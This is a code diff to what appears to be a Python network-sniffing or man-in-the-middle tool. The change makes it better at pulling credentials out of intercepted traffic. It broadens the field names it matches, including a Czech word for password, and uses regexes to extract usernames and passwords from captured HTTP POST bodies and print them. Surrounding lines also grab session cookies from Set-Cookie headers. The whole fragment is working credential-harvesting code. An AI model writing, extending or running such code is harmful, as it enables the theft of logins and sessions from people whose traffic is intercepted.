@@ -78,12 +78,30 @@ class Device:
                             pass
 
                     if "POST" in raw_data:
-                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
-                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
-                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
-                            for line in raw_data.split('\r\n'):
-                                if '=' in line and len(line) < 100:
-                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
+                        # Form field recognition for credentials
+                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']) and \
+                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
+                            print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                            # Find login information
+                            login_data = None
+                            for field in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']:
+                                if field in raw_data.lower():
+                                    login_data = re.search(rf'{field}=[^&]*', raw_data)
+                                    if login_data:
+                                        login_data = login_data.group().split('=')[1]
+                                        break
+                            # Find password information
+                            password_data = None
+                            for field in ['password', 'pass', 'pwd', 'heslo']:
+                                if field in raw_data.lower():
+                                    password_data = re.search(rf'{field}=[^&]*', raw_data)
+                                    if password_data:
+                                        password_data = password_data.group().split('=')[1]
+                                        break
+                            # Print login and password found
+                            if login_data and password_data:
+                                print(f"{Fore.GREEN}login: {login_data}{Style.RESET_ALL}")
+                                print(f"{Fore.GREEN}pwd: {password_data}{Style.RESET_ALL}")
 
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
